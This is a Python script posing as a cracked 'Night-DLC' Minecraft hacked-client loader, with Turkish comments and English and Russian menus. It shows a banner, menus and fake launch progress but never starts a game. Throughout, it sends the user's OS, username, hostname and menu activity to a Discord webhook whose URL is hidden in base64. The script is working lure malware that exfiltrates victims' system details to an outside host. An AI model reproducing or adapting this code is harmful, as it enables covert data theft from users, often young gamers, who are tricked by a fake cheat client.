#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FAKE MINECRAFT HACKED CLIENT LOADER
Night-DLC | Coded by nukeqed (cracked pre)
"""

import os
import sys
import time
import random
import base64
import json
import platform
from datetime import datetime

# ==================== KONFİGÜRASYON ====================
WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NDAwMjgzMjU4NzAzMDY2MC9zcklWVURHWG1pQVZhYWtHampLYm9mdnotRFZVNjJudEFXTy1iYVZPeGJVT1VMeVRmck1tc3c5b1dzZnlKVU5DQWRUZQ=="

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# ==================== WEBHOOK MANAGER ====================
class WebhookManager:
    @staticmethod
    def decode_webhook():
        """Webhook'u decode et"""
        try:
            return base64.b64decode(WEBHOOK_B64).decode()
        except:
            return None
    
    @staticmethod
    def send_embed(title, description, color=0x00ff00):
        """Embed gönder"""
        webhook_url = WebhookManager.decode_webhook()
        if not webhook_url:
            return False
        
        try:
            import requests
            embed = {
                "title": title,
                "description": description,
                "color": color,
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {
                    "text": "Night-DLC | Minecraft Client"
                }
            }
            
            payload = {
                "embeds": [embed],
                "username": "Night-DLC Loader",
                "avatar_url": "https://cdn.discordapp.com/attachments/123/456/minecraft.png"
            }
            
            response = requests.post(webhook_url, json=payload, timeout=10)
            return response.status_code in [200, 204]
        except:
            return False
    
    @staticmethod
    def log_activity(activity):
        """Kullanıcı aktivitesini logla"""
        try:
            # Sistem bilgisi topla
            system_info = {
                "platform": platform.system(),
                "username": os.getenv('USER') or os.getenv('USERNAME'),
                "hostname": platform.node(),
                "activity": activity,
                "time": datetime.now().isoformat()
            }
            
            WebhookManager.send_embed(
                "📱 User Activity Log",
                f"```json\n{json.dumps(system_info, indent=2)}\n```",
                0x5865F2
            )
        except:
            pass

# ==================== FAKE MINECRAFT LOADER ====================
class NightDLCLoader:
    def __init__(self):
        self.language = "english"
        self.memory = 2048  # MB
        self.version = "1.20.1"
        self.client_name = "Night-DLC Premium"
        self.loader_version = "v2.7.3"
        
    def clear_screen(self):
        """Ekranı temizle"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        """Banner göster"""
        self.clear_screen()
        
        banner = f"""
{Colors.PURPLE}╔{'═'*60}╗{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}{' '*18}███▄    █  ██▓  ██▓ ▄████▄  {Colors.PURPLE}{' '*18}║{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}{' '*18}██ ▀█   █ ▓██▒ ▓██▒▒██▀ ▀█  {Colors.PURPLE}{' '*18}║{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}{' '*18}▓██  ▀█ ██▒▒██▒ ▒██▒▒▓█    ▄ {Colors.PURPLE}{' '*18}║{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}{' '*18}▓██▒  ▐▌██▒░██░ ░██░▒▓▓▄ ▄██▒{Colors.PURPLE}{' '*18}║{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}{' '*18}▒██░   ▓██░░██░ ░██░▒ ▓███▀ ░{Colors.PURPLE}{' '*18}║{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}{' '*18}░ ▒░   ▒ ▒ ░▓   ░▓  ░ ░▒ ▒  ░{Colors.PURPLE}{' '*18}║{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}{' '*18}░ ░░   ░ ▒░ ▒ ░  ▒ ░  ░  ▒   {Colors.PURPLE}{' '*18}║{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}{' '*18}   ░   ░ ░  ▒ ░  ▒ ░░        {Colors.PURPLE}{' '*18}║{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}{' '*18}         ░  ░    ░  ░ ░      {Colors.PURPLE}{' '*18}║{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}{' '*18}                   ░         {Colors.PURPLE}{' '*18}║{Colors.END}
{Colors.PURPLE}╠{'═'*60}╣{Colors.END}
{Colors.PURPLE}║{Colors.YELLOW}           NIGHT-DLC MINECRAFT CLIENT LOADER           {Colors.PURPLE}║{Colors.END}
{Colors.PURPLE}║{Colors.GREEN}          Version: {self.loader_version} • {self.client_name}       {Colors.PURPLE}║{Colors.END}
{Colors.PURPLE}║{Colors.CYAN}           Coded by nukeqed (cracked pre)             {Colors.PURPLE}║{Colors.END}
{Colors.PURPLE}╚{'═'*60}╝{Colors.END}
        """
        
        print(banner)
        
        # Aktivite logla
        WebhookManager.log_activity("Client started")
    
    def get_translation(self, key):
        """Dil çevirisi"""
        translations = {
            "english": {
                "title": "MAIN MENU",
                "option1": "1. Launch Game",
                "option2": "2. Increase Memory",
                "option3": "3. Change Language",
                "option4": "4. Exit",
                "select": "Select option [1-4]: ",
                "launching": "Launching Minecraft...",
                "memory": "Memory Allocation",
                "language": "Language Settings",
                "current_mem": f"Current memory: {self.memory}MB",
                "enter_mem": "Enter new memory amount (MB): ",
                "mem_updated": "Memory updated successfully!",
                "lang_select": "Select language (1-English, 2-Russian): ",
                "lang_updated": "Language updated to: ",
                "success": "Game launched successfully!",
                "exit_msg": "Exiting Night-DLC...",
                "error": "Error: Invalid option!",
                "press_enter": "Press Enter to continue...",
                "closing": "Closing in {} seconds...",
                "game_starting": "Game is starting..."
            },
            "russian": {
                "title": "ГЛАВНОЕ МЕНЮ",
                "option1": "1. Запустить игру",
                "option2": "2. Увеличить память",
                "option3": "3. Сменить язык",
                "option4": "4. Выход",
                "select": "Выберите опцию [1-4]: ",
                "launching": "Запуск Minecraft...",
                "memory": "Выделение памяти",
                "language": "Настройки языка",
                "current_mem": f"Текущая память: {self.memory}MB",
                "enter_mem": "Введите новый объем памяти (МБ): ",
                "mem_updated": "Память успешно обновлена!",
                "lang_select": "Выберите язык (1-Английский, 2-Русский): ",
                "lang_updated": "Язык изменен на: ",
                "success": "Игра успешно запущена!",
                "exit_msg": "Выход из Night-DLC...",
                "error": "Ошибка: Неверная опция!",
                "press_enter": "Нажмите Enter для продолжения...",
                "closing": "Закрытие через {} секунд...",
                "game_starting": "Игра запускается..."
            }
        }
        
        return translations[self.language].get(key, key)
    
    def show_menu(self):
        """Ana menüyü göster"""
        self.print_banner()
        
        menu = f"""
{Colors.CYAN}╔══════════════════[{self.get_translation('title')}]══════════════════╗{Colors.END}
{Colors.CYAN}║                                                          ║{Colors.END}
{Colors.CYAN}║  {Colors.GREEN}{self.get_translation('option1'):<58}{Colors.CYAN}║{Colors.END}
{Colors.CYAN}║  {Colors.GREEN}{self.get_translation('option2'):<58}{Colors.CYAN}║{Colors.END}
{Colors.CYAN}║  {Colors.GREEN}{self.get_translation('option3'):<58}{Colors.CYAN}║{Colors.END}
{Colors.CYAN}║  {Colors.GREEN}{self.get_translation('option4'):<58}{Colors.CYAN}║{Colors.END}
{Colors.CYAN}║                                                          ║{Colors.END}
{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}{self.get_translation('select')}{Colors.END}"""
        
        return input(menu).strip()
    
    def launch_game(self):
        """Oyunu başlat (fake)"""
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{Colors.CYAN}[{Colors.GREEN}*{Colors.CYAN}] {self.get_translation('launching')}{Colors.END}")
        time.sleep(1)
        
        print(f"\n{Colors.YELLOW}⏳ {self.get_translation('game_starting')}{Colors.END}")
        
        # Fake progress
        steps = [
            "Initializing Minecraft...",
            "Loading assets...",
            "Preparing game environment...",
            "Connecting to servers...",
            "Starting game client..."
        ]
        
        for step in steps:
            print(f"{Colors.GREEN}[✓] {step}{Colors.END}")
            time.sleep(0.7)
        
        print(f"\n{Colors.GREEN}✅ {self.get_translation('success')}{Colors.END}")
        
        # Webhook'a bildirim gönder
        WebhookManager.log_activity("Game launched")
        
        print(f"\n{Colors.YELLOW}⏰ {self.get_translation('closing').format(5)}{Colors.END}")
        
        # Geri sayım
        for i in range(5, 0, -1):
            print(f"{Colors.CYAN}[{i}] {self.get_translation('closing').format(i)}{Colors.END}", end='\r')
            time.sleep(1)
        
        # Webhook'a kapanış bildirimi
        WebhookManager.send_embed(
            "🎮 Game Session Ended",
            f"Minecraft game launched successfully\nMemory: {self.memory}MB\nClient: {self.client_name}",
            0x00ff00
        )
        
        print(f"\n\n{Colors.GREEN}👋 {self.get_translation('exit_msg')}{Colors.END}")
        time.sleep(1)
        sys.exit(0)
    
    def increase_memory(self):
        """Hafızayı artır (fake)"""
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{Colors.CYAN}════════════[{self.get_translation('memory')}]════════════{Colors.END}")
        print(f"\n{Colors.YELLOW}{self.get_translation('current_mem')}{Colors.END}")
        
        try:
            print(f"\n{Colors.WHITE}{self.get_translation('enter_mem')}{Colors.END}", end='')
            new_memory = input()
            
            if new_memory.isdigit():
                self.memory = int(new_memory)
                print(f"\n{Colors.GREEN}✅ {self.get_translation('mem_updated')}{Colors.END}")
                
                # Webhook'a bildirim
                WebhookManager.send_embed(
                    "🔄 Memory Updated",
                    f"Memory changed to: {self.memory}MB",
                    0xFFFF00
                )
            else:
                print(f"\n{Colors.RED}❌ Invalid input! Using default.{Colors.END}")
        except:
            print(f"\n{Colors.RED}❌ Error updating memory.{Colors.END}")
        
        input(f"\n{Colors.CYAN}{self.get_translation('press_enter')}{Colors.END}")
    
    def change_language(self):
        """Dili değiştir"""
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{Colors.CYAN}══════════[{self.get_translation('language')}]══════════{Colors.END}")
        print(f"\n{Colors.YELLOW}1. English")
        print(f"2. Russian{Colors.END}")
        
        print(f"\n{Colors.WHITE}{self.get_translation('lang_select')}{Colors.END}", end='')
        choice = input().strip()
        
        if choice == "1":
            self.language = "english"
            print(f"\n{Colors.GREEN}✅ {self.get_translation('lang_updated')}English{Colors.END}")
        elif choice == "2":
            self.language = "russian"
            print(f"\n{Colors.GREEN}✅ {self.get_translation('lang_updated')}Russian{Colors.END}")
        else:
            print(f"\n{Colors.RED}❌ {self.get_translation('error')}{Colors.END}")
        
        # Webhook'a bildirim
        WebhookManager.send_embed(
            "🌍 Language Changed",
            f"New language: {self.language.title()}",
            0x0000FF
        )
        
        input(f"\n{Colors.CYAN}{self.get_translation('press_enter')}{Colors.END}")
    
    def exit_program(self):
        """Programdan çık"""
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{Colors.YELLOW}⏳ {self.get_translation('closing').format(3)}{Colors.END}")
        
        # Geri sayım
        for i in range(3, 0, -1):
            print(f"{Colors.CYAN}[{i}] {self.get_translation('closing').format(i)}{Colors.END}", end='\r')
            time.sleep(1)
        
        print(f"\n\n{Colors.GREEN}👋 {self.get_translation('exit_msg')}{Colors.END}")
        
        # Webhook'a kapanış bildirimi
        WebhookManager.send_embed(
            "🔌 Client Closed",
            "Night-DLC Minecraft Loader closed by user",
            0xFF0000
        )
        
        time.sleep(1)
        sys.exit(0)
    
    def run(self):
        """Ana döngü"""
        while True:
            try:
                choice = self.show_menu()
                
                if choice == "1":
                    self.launch_game()  # Bu fonksiyon programı kapatır
                elif choice == "2":
                    self.increase_memory()
                elif choice == "3":
                    self.change_language()
                elif choice == "4":
                    self.exit_program()
                else:
                    print(f"\n{Colors.RED}❌ {self.get_translation('error')}{Colors.END}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n\n{Colors.RED}[!] Program interrupted{Colors.END}")
                self.exit_program()
            except Exception as e:
                print(f"\n{Colors.RED}[-] Error: {str(e)}{Colors.END}")
                time.sleep(2)

# ==================== ANA PROGRAM ====================
def main():
    """Programı başlat"""
    
    # Webhook testi
    print(f"{Colors.CYAN}[*] Testing webhook connection...{Colors.END}")
    
    if WebhookManager.decode_webhook():
        print(f"{Colors.GREEN}[✓] Webhook loaded successfully{Colors.END}")
        time.sleep(1)
    else:
        print(f"{Colors.RED}[!] Webhook connection failed{Colors.END}")
        time.sleep(2)
    
    # Loader'ı başlat
    loader = NightDLCLoader()
    loader.run()

if __name__ == "__main__":
    main()